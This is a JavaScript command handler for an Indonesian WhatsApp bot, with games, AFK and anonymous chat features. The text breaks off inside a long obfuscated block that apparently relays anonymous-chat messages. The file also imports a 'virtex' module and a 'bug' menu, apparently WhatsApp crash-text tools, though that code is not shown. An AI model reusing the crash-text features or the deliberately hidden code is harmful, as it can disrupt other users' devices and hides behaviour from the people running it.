// no enc? beli banh😂 wa.me/6281575886399

"use strict";
const {
	downloadContentFromMessage,
	generateWAMessageFromContent
} = require("@whiskeysockets/baileys")
const { color, bgcolor } = require('../lib/color')
const { generateProfilePicture, getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, makeid } = require("../lib/myfunc");
const { webp2mp4File } = require("../lib/convert")
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const { addPlayGame, getJawabanGame, isPlayGame, cekWaktuGame, getGamePosi } = require("../lib/game");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const tictac = require("../lib/tictac");
const _prem = require("../lib/premium");
const { genMath, modes } = require("../lib/math");
const { TelegraPh, UploadFileUgu } = require("../lib/uploader");

const fs = require ("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("node:child_process");
const ffmpeg = require("fluent-ffmpeg");
const fetch = require("node-fetch");
const axios = require("axios");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const petik = '```'
const { virtex } = require('../vanz_other/virtex')
const { jadibot } = require('../jadibot')

// Exif
const Exif = require("../lib/exif")
const exif = new Exif()

// Werewolf
const {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require("../lib/werewolf")

//new data by vanz
let afk = require("../lib/afk");

// DB Game
let asahotak = [];
let caklontong = [];
let family100 = [];
let siapakahaku = [];
let susunkata = [];
let tebakbendera = [];
let tebakgambar = [];
let tebakkalimat = [];
let tebakkata = [];
let tebakkimia = [];
let tebaklirik = [];
let kuis = [];
let math = [];
let tictactoe = [];
let casino = [];

// Database
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./message/response.json'));
let anonymous = JSON.parse(fs.readFileSync('./database/anonymous.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async(conn, msg, m, setting, store, welcome) => {
	try {
		let { ownerNumber, ownerName, owner, creatorNumber, botName, packname, author, pathimg, pathimg1, apikey, hmm, gamewaktu, limitCount } = setting
		let { allmenu, menuall, menumain, menuconver, menutools, menustiker, menuai, menuanon, menurandom, menudownload, menubug, menusearch, menugame, menupo, menupb, menureligion, menugrup, menuowner } = require('./help')
		if (msg.mentioned && msg.mentioned.includes('')) { Object.keys(msg.mentioned).forEach((i) => { if (msg.mentioned[i] == '') { msg.mentioned.splice(i, 1) } }) }
		const { type, isQuotedMsg, quotedMsg, now, fromMe, mentioned, isBaileys } = msg
		if (isBaileys) return
		const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const content = JSON.stringify(msg.message)
		const from = msg.key.remoteJid
		const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
        const toJSON = j => JSON.stringify(j, null,'\t')
        

		if (conn.multi) {
			var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
		} else {
			if (conn.nopref) {
				prefix = ''
			} else {
				prefix = conn.prefa
			}
		}

		const args = chats.split(' ')
		const command = chats.toLowerCase().split(' ')[0] || ''
		const isCmd = command.startsWith(prefix)
		const isGroup = msg.key.remoteJid.endsWith('@g.us')
		const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
		const isOwner = ownerNumber.includes(sender)
		const isCreator = creatorNumber.includes(sender)
		const pushname = msg.pushName
		const q = chats.slice(command.length + 1, chats.length)
		const body = chats.startsWith(prefix) ? chats : ''
		const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
		const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.id : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender)
		const isUser = pendaftar.includes(sender)
		const isAfkOn = afk.checkAfkUser(sender, _afk)
		const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const isWelcome = isGroup ? welcome.includes(from) ? true : false : false
        const isAntiLink = antilink.includes(from) ? true : false

		const gcounti = setting.gcount
		const gcount = isPremium ? gcounti.prem : gcounti.user
		const templateButtons = [ {index: 1, urlButton: {displayText: ' Star Baileys on GitHub!', url: 'https://github.com/adiwajshing/Baileys'}}, {index: 2, callButton: {displayText: 'Call me!', phoneNumber: '+1 (234) 5678-901'}}, {index: 3, quickReplyButton: {displayText: 'This is a reply, just like normal buttons!', id: 'id-like-buttons-message'}}, ] 
        const templateMessage = { text: "Hi it's a template message", footer: 'Hello World', templateButtons: templateButtons }
            
		const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : ['group@broadcast']
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "hello" : "world"
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : ['status@broadcast']
        const mentionUser = mention != undefined ? mention.filter(n => n) : []

		async function downloadAndSaveMediaMessage (msg, type_file, path_file) {
           if (type_file === 'image') {
             var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'video') {
             var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'sticker') {
             var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           } else if (type_file === 'audio') {
             var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
             let buffer = Buffer.from([])
             for await(const chunk of stream) {
               buffer = Buffer.concat([buffer, chunk])
             }
             fs.writeFileSync(path_file, buffer)
             return path_file
           }
        }
		const sendFileFromUrl =async (from, url, caption, options ={}, quoted ) => {
            let res = await axios.head(url)
            let mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return await conn.sendMessage(from, { video: { url : await convertToVideo(url, '.gif') }, caption: caption, gifPlayback: true}, {quoted: msg}, options)
                }
            let type = mime.split("/")[0]+"Message"
            if(mime.split("/")[0] === "image"){
                return conn.sendMessage(from, { image: await getBuffer(url), caption: caption, height: 3264, width: 2448}, {quoted: msg }, options)
            } else if(mime.split("/")[0] === "video"){
                return conn.sendMessage(from, { video: await getBuffer(url), caption: caption, height: 848, width: 848}, {quoted: msg}, options)
            } else if(mime.split("/")[0] === "audio"){
                return conn.sendMessage(from, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg'}, {quoted: msg}, options)
            } else {
                let a = await getBuffer(url)
                let b = './temp/' + getRandom()
                let c = fs.writeFileSync(b, a)
                let d = await mimes.fromFile(b)
                let messege = await conn.sendMessage(from, { document: { url: b }, mimetype: d.mime, fileName: caption}, {quoted: msg}, options)
                fs.unlinkSync(b)
                return messege
            }
        }
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
		const isEmoji = (emo) => {
            let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
            let regexEmoji = new RegExp(emoji_ranges, 'gi');
            return emo.match(regexEmoji)
        }
		function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
		function monospace(string) {
            return '```' + string + '```'
        }
		function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
		const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
		function mentions(teks, mems = [], id) {
			if (id == null || id == undefined || id == false) {
			  let res = conn.sendMessage(from, { text: teks, mentions: mems })
			  return res
			} else {
		      let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
		      return res
 		    }
		}
		const nebal = (angka) => {
            return Math.floor(angka)
        }
		function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
       }      
       const reply = (teks) => {
         return conn.sendMessage(from, {
           text: teks, contextInfo: {
             externalAdReply: {'showAdAttribution': !![],
              title: `5 - ${botName}`,
              body: `${pushname}`,
              containsAutoReply: true,
              mediaType: 289,
              thumbnail: fs.readFileSync('./media/bg1.jpg'),
              sourceUrl: hmm.linkmenu,
              footer: `${ownerName}`
             }
           }
         }, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `120363177398588033@g.us` } : {}) }, message: { conversation: `Five - ${botName}, Halo ${pushname} 👋` }}})                    
		const sendMess = (hehe, teks) => {
			conn.sendMessage(hehe, { text, teks })
		}
		async function loading () {
                    var kyuu = [
                        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
                        "《 ████▒▒▒▒▒▒▒▒》30%",
                        "《 ███████▒▒▒▒▒》50%",
                        "《 ██████████▒▒》80%",
                        "《 ████████████》100%",
                        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
                        ]
                    let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

                   for (let i = 0; i < kyuu.length; i++) {
                  await sleep(100)
                  await conn.sendMessage(from, {text: kyuu[i], edit: key });//PESAN LEPAS
          }
        }
        async function prata () {
                    var vonzi = [
                        "《 ⚡▒▒▒▒▒▒▒▒▒▒▒》10%",
                        "《 ⚡⚡⚡⚡▒▒▒▒▒▒▒▒》30%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡▒▒▒▒▒》50%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡▒▒》80%",
                        "《 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡》100%",
                        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
                        ]
                    let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

                   for (let i = 0; i < vonzi.length; i++) {
                  await sleep(100)
                  await conn.sendMessage(from, {text: vonzi[i], edit: key });//PESAN LEPAS
          }
        }
		async function sendStickerFromUrl(from, url, packname1 = packname, author1 = author, options = {}) {
            var names = Date.now() / 10000;
            var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            exif.create(packname1, author1, `sendstc_${names}`)
            download(url, './sticker/' + names + '.png', async function () {
                let filess = './sticker/' + names + '.png'
                let asw = './sticker/' + names + '.webp'
                exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, async (err) => {
                    exec(`webpmux -set exif ./sticker/sendstc_${names}.exif ${asw} -o ${asw}`, async (error) => {
                        conn.sendMessage(from, { sticker: fs.readFileSync(asw) }, options)
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                        fs.unlinkSync(`./sticker/sendstc_${names}.exif`)
                    })
                })
            })
        }

		const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

		// Auto Read & Presence Online
		if (conn.mode === 'self'){
            if (!fromMe && !isOwner) return
            if (fromMe && isBaileys) return
        }

		// Auto Registrasi
		if (isCmd && !isUser) {
		  pendaftar.push(sender)
		  fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
		}
		
		// Premium
		_prem.expiredCheck(conn, premium)
		
		// Tictactoe
        if (isTicTacToe(from, tictactoe)) tictac(chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)
               
       
        
        //new coding message s kontak
        let list = []
        for (let i of owner) {
            list.push({
                displayName: conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${conn.getName(i + '@s.whatsapp.net')}\nFN:${conn.getName(i + '@s.whatsapp.net')}\nORG:Vanz X Daf ;\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:uzidiio3@gmail.com \nitem2.X-ABLabel:Email\nitem3.URL:https://api.xcodeteam.xyz\nitem3.X-ABLabel:Rest APIs\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            })
        }
        
        //aepka
        if (isGroup && !fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    newReply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                conn.sendMessage(from, `${pushname} telah kembali dari afk`, msg)
            }
        }
        
                // Function for Casino
                const isPlayCasino = (from, casino) => {
                   var status = false
                   Object.keys(casino).forEach((i) => {
                     if (casino[i].session == from) {
                       status = true
                     }
                   })
                   return status
                }
                const getCasino = (from, casino) => {
                   var posi = null
                   Object.keys(casino).forEach((i) => {
                     if (casino[i].session == from) {
                       posi = i
                     }
                   })
                   return posi
                }
                const setCasino = (chatId, player1, player2, nominal, _db) => {
                 if (!isPlayCasino(chatId, _db)) {
                   var obj = {
                      status: true,
                      session: chatId,
                      turn: 'Z',
                      Z: player1,
                      Y: player2,
                      nominal: nominal,
                      expired: setTimeout(() => {
                        var teksc = `Waktu casino habis, tidak ada jawaban dari @${player2.split("@")[0]}`
                        conn.sendMessage(chatId, { text: teksc, mentions: [player2+'@s.whatsapp.net'] })
                        _db.splice(getCasino(chatId, _db), 1)
                      }, 30000)
                    }
                    _db.push(obj)
                 }
                }
                const deleteCasino = (from, _db) => {
                   if (isPlayCasino(from, _db)) {
                     _db.splice(getCasino(from, _db), 1)
                     return true
                   } else {
                     return false
                   }
                }
                const sesiCasino = (from, casino) => {
                   return casino[getCasino(from, casino)]
                }
                
           // function for Menfess
          function getMenfessPosi(org, _db) {
          let position = null
          Object.keys(_db).forEach((i) => {
            if (_db[i].sender == org) {
            position = i
            }
          })
          if (position !== null) {
            return position
          }
        }
        
        // Function for Anonymous Chat
        function anonyCheck(who = '', _db) {
            return [_db.a, _db.b].includes(who)
        }
        function anonyOther(who = '', _db) {
            return who == _db.a ? _db.b : who == _db.b ? _db.a : ''
        }
                
        // write for anonymous
        setInterval(async () => {
            fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonymous, null, 2))
        }, 30 * 1000)
        
        // cek cmd for anonymous
        var cekForAnon = isCmd && args[0].length > 1
        
        // xixixi
        function _0x7e1fdb(_0x51b7f7,_0x5f2497,_0x485da5,_0x28fe88,_0x1f42ec){return _0x372c(_0x485da5- -0x3a6,_0x51b7f7);}function _0x34e6b5(_0x4a70b8,_0x42416b,_0x21c575,_0x391831,_0x1e6224){return _0x372c(_0x4a70b8- -0x233,_0x391831);}(function(_0x251059,_0x1619ee){function _0x5e2347(_0x171c85,_0x2089bb,_0x9cac65,_0x5d1c66,_0x3089bf){return _0x372c(_0x9cac65- -0x1d7,_0x5d1c66);}function _0x247826(_0x264bb1,_0x4df469,_0x9cb1d,_0x5ef1b7,_0x2e315f){return _0x372c(_0x5ef1b7-0x8b,_0x4df469);}var _0x43046a=_0x251059();function _0x37e9f2(_0x13586c,_0x7d36e6,_0x4b22b5,_0x227437,_0xbeed5d){return _0x372c(_0x227437-0x190,_0x4b22b5);}function _0xd59add(_0x22b9f6,_0xe666c0,_0x4fd1b7,_0x45830b,_0x334679){return _0x372c(_0x22b9f6-0x17f,_0xe666c0);}function _0x5865e4(_0x5ede16,_0x58da6a,_0x91d9,_0x4ff091,_0x1edbd4){return _0x372c(_0x5ede16- -0x1d4,_0x91d9);}while(!![]){try{var _0x1a5cf4=-parseInt(_0x5e2347(-0x51,-0xa,0x2d,'IYKu',0x48))/(0x35d+0xf94*-0x1+0xc38)*(-parseInt(_0x247826(0x1b2,'Bhc@',0x1a4,0x1f1,0x1e4))/(0x2076+-0x15c7+-0xaad))+-parseInt(_0x247826(0x239,'1jLP',0x20c,0x24f,0x1d3))/(0x4a8+-0x9ba*0x4+-0xb3*-0x31)+-parseInt(_0xd59add(0x37b,'bJOz',0x391,0x38e,0x3b9))/(-0x1*0x1d7d+0x184*0x14+-0xcf)+-parseInt(_0xd59add(0x2dd,'09eV',0x33e,0x359,0x291))/(0xec3+0x1*0x17c9+-0x2687*0x1)*(parseInt(_0x247826(0x198,'jAr(',0x1a4,0x20b,0x25e))/(0x223*0x10+0x1f*-0xbc+-0xb66))+-parseInt(_0xd59add(0x396,'1jLP',0x35e,0x3fd,0x374))/(0x101*-0x21+-0x26a9*-0x1+-0x581)*(parseInt(_0x5865e4(0x6f,0xc4,'YDNX',0xe4,0xb2))/(0x873+0x5cb*0x2+0x1401*-0x1))+parseInt(_0x5865e4(0xd,-0x3,'iVox',0x84,0x1f))/(-0x1*0x1f1+-0x50*0x34+-0x1*-0x123a)+parseInt(_0xd59add(0x31c,'aYGT',0x34a,0x338,0x2f2))/(-0x1*-0xc1d+0x3*0x397+-0x88*0x2b)*(parseInt(_0x247826(0x21f,'v1m[',0x291,0x241,0x1f4))/(0x237*-0x2+0x1949*-0x1+-0x1*-0x1dc2));if(_0x1a5cf4===_0x1619ee)break;else _0x43046a['push'](_0x43046a['shift']());}catch(_0x4b5b70){_0x43046a['push'](_0x43046a['shift']());}}}(_0xff48,0x4*0x54fda+0x5471a+-0xb8736));if(!isGroup&&!msg[_0x7e1fdb('bJOz',-0x19d,-0x1e4,-0x195,-0x188)][_0x5cf1a3(0x3a3,0x3dc,0x32e,'CwkS',0x389)+'e']&&!cekForAnon){let rums=Object[_0x7e1fdb('ggif',-0x126,-0x192,-0x136,-0x210)+'s'](anonymous)[_0x5cf1a3(0x40e,0x390,0x3e8,'zl5U',0x3da)](_0x38fbbf=>[_0x38fbbf['a'],_0x38fbbf['b']][_0x5cf1a3(0x3c6,0x309,0x337,'e9sY',0x357)+_0x4ac47f(0x1f9,0x1c3,'n2G%',0x1c4,0x1d7)](sender)&&_0x38fbbf[_0x34e6b5(-0x41,-0x68,-0x90,'wO62',0x31)]==_0x7e1fdb('N)XE',-0x24c,-0x237,-0x239,-0x1f7)+_0x34e6b5(-0xe0,-0xca,-0xa5,'R%bu',-0x144));if(rums){var partnerJID=[rums['a'],rums['b']][_0x5cf1a3(0x355,0x3e3,0x3ed,'jAr(',0x396)](_0x1990d4=>_0x1990d4!==sender);if(msg[_0x34e6b5(-0xd,-0x1e,-0x12,'QhUS',0x14)]==_0x34e6b5(-0xc5,-0x91,-0xfe,'1jLP',-0x9a)+_0x349772(-0x133,-0x148,'4OM8',-0x126,-0x110)+'on'){var _0x1348ad={};_0x1348ad[_0x34e6b5(-0x82,-0xe2,-0xb9,'R%bu',-0xb8)]=chats,conn[_0x34e6b5(-0xd1,-0xf8,-0xa8,'Q]SR',-0x102)+_0x34e6b5(-0xde,-0x66,-0x79,'JY0J',-0xd7)+'e'](partnerJID,_0x1348ad);}else{if(msg[_0x34e6b5(-0xc8,-0xa6,-0xf7,'al]B',-0x5a)]==_0x34e6b5(-0xc3,-0xc1,-0x8f,'JY0J',-0xb6)+_0x4ac47f(0x152,0x11c,'U2tT',0xe8,0x17c)+_0x5cf1a3(0x3e1,0x41a,0x3bc,'7wLv',0x3d7)+_0x5cf1a3(0x382,0x32d,0x342,'iVox',0x368)){var _0x31febf={};_0x31febf[_0x349772(-0x14d,-0x118,'v1m[',-0xcd,-0xcb)]=chats,_0x31febf[_0x4ac47f(0x108,0x103,'r3kl',0x125,0x16f)+_0x7e1fdb('al]B',-0x1cf,-0x1d9,-0x1a4,-0x1ff)+'o']=msg[_0x349772(-0x178,-0x158,'R%bu',-0x16a,-0x18e)+'ge'][_0x4ac47f(0x1c5,0x173,'CCFL',0x16f,0x123)+_0x4ac47f(0x1ad,0x154,'V4^b',0x1ca,0x141)+_0x5cf1a3(0x42e,0x457,0x473,'DcA#',0x3f9)+_0x5cf1a3(0x38e,0x386,0x348,'N)XE',0x39c)][_0x5cf1a3(0x3ea,0x32a,0x31e,'dJE2',0x393)+_0x4ac47f(0x1ae,0x1b8,'ds5J',0x186,0x19a)+'o'],conn[_0x34e6b5(-0x47,-0x1d,0x10,'PMt@',-0x30)+_0x34e6b5(-0x4e,-0x56,-0x77,'[)u9',-0xc9)+'e'](partnerJID,_0x31febf);}else{var contextInfo=msg[_0x34e6b5(0x5,-0x23,-0x5e,'0v@H',0xa)+'ge'][msg[_0x5cf1a3(0x368,0x32c,0x338,'WUm1',0x354)]][_0x5cf1a3(0x3fc,0x33f,0x3bf,'zl5U',0x3ad)+_0x5cf1a3(0x2f7,0x318,0x354,'L%Kz',0x331)+'o'],_0x5c9f41={};_0x5c9f41[_0x349772(-0x1c4,-0x17c,'^WKx',-0x104,-0x19f)+_0x7e1fdb('DcA#',-0x184,-0x176,-0x19f,-0x110)+'o']=contextInfo,conn[_0x4ac47f(0x1a8,0x16c,'CwkS',0x187,0x14f)+_0x5cf1a3(0x37e,0x342,0x304,'wO62',0x37b)+_0x5cf1a3(0x394,0x415,0x39a,'COf9',0x3b9)+_0x5cf1a3(0x36e,0x329,0x3a6,'aYGT',0x392)+'nt'](partnerJID,msg[_0x7e1fdb('^WKx',-0x178,-0x1a1,-0x1a2,-0x155)+'ge'],_0x5c9f41);}}}}function _0x5cf1a3(_0x21c718,_0x157621,_0x658090,_0x3b6fc8,_0x34dc7a){return _0x372c(_0x34dc7a-0x1b3,_0x3b6fc8);}function _0xff48(){var _0x366c8d=['W6LFWPNcTIi','W63cJWtcHSoW','qetcLeXW','W71VW5NcKuy','jGCzW4TS','xmoCc0RcOq','W5ldN1tcI8kcW5NcRqddOIXJw8kr','WR50yCkgW7W','qWH1AW','lmkwW5jMxG','WQJdKvRdMCk3','wmoGW6NJG5vV','tmoVW4tcTSkd','WODtCIGn','WP4XW5VdNq','WPSUCaGGhSkA','AGaLW7ddJG','y8kpWQtcNtC','d8ohWOiUoa','nmoVj3xdVG','hJpcKahcQW','W7lWQ7gLcUkaK8ke','BKldOColWP8','sgTFyhG','WOKXCYqB','vu91ASor','WRmMr2fb','WRm8feDq','W7L0WORcQWe','rtWEW5TO','WPBdIGJdL8oE','WR7cUmoXWPddPa','WQ98FmkC','wmkhW4D8CmkXW7johJapW7VcRq','rmoGoN7cOG','pL0p','wmklWQpdMre','W6bIdtCjWPq4p8opW7VdMhi','W77cLXNdMCkBW7hcNmkkDG','W7vPWPBdQIe','eCo3W65vWR0','WPTKFLVcLHSzwJ/cLSkseG','t8kQW4tcRmkp','BNddVmo7WPa','rbvOBSov','abSeW55U','WR8pExa6','WP3cPmkXWPpdQq','W4aOW71/FG','d8kVWO0ThW','WOdcHWddNmor','W5LsEcWn','WRZcMmoGW6Spj8oBWQTXtmkiywS','WPSuqCkbAa','W6RdGCkWWQfC','EfpdOmoWWRa','BK7dVSo9WO8','W5ZcG0SVaq','vsaBW5RdSG','mmohW6FdH1O','WO/cK35WWQ4lW7uikG','WRPXjmkZWR0','gSk0WRiJga','W7BcSW0','j8kbW4TQxG','W5Oyqmktja','WROoyq','W6ZdT8k/ha','W4iYlSkakW','W4ySW70RDq','t8k8W5a','vSo1bmoYAa','44orW7FdMmkfW6W','sSk8s8oYW64','WORcHby','WO4avmkx','WRVcVSoXWOa','WR/cOvRcI0u','xZeIW5JdRq','W6RdUCoHtCoN','WQpcGK3dKCkX','Ev/dOW','WRpcTSoXWOm','cWCAW5zN','WQS3ASknW6K','WQybW7xcQvS','t8oJg8oz','nSoz4Octkmka','W7dIGzSeWRi','W4G4ma','j8ooW4HQwa','W4RcMqddKCoc','qCkOoxxdOXddQSkYWO0','W4ySW6aSFq','xuxcM1HC','oSkEW4PQra','qJykW5JcQW','WPK1W4tdJa','WRWdW7ilWOG','W6tcSehcHSoG','WP01W5ldN8oq','W6eOW704Fq','W4WsCJOU','DCoWW5emBa','iSkVWODpmSokW4q2zmoaW6RcRq','rW53l8op','WQffDMuV','WQybW7hcOK4','sar1E8om','sMPryhG','8l+EQd3cLSoYxq','jLKyWQ9b','W4VdVSk8w8o/','W4pcJeH6iW','tCkHW4q','WRagBsa2','DmokWO4','hmkPWRmRbq','xSo1emompq','W4VcGeyPaq','WQZdIqxcMmk7','W7LsmCk0ka','wuxdISoDWQ4','WPRdPcHlpG','W4a6keZdQq','WPuxvW','vmoba0/dSW','r8kZWQ0bWPTJW7yenhW','v8k6rCo2W64','FSoXW5KxAW','AgPvz3G','t8k2x2ZcJq','W6S6WR0ODa','hSkDWP8Qpa','WQOACSoUrq','W7TDWPRcMH42WPi','ymoeWQtcNa4','WPVdKrzPuSoLWO